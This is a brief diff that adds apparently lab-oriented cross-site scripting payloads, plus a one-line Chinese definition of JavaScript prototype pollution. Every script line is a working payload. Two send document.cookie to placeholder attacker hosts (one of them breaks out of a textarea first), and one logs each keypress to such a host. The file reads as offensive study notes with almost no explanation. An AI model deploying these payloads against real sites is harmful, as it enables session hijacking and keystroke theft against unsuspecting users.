@@ -1,0 +1,7 @@
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。
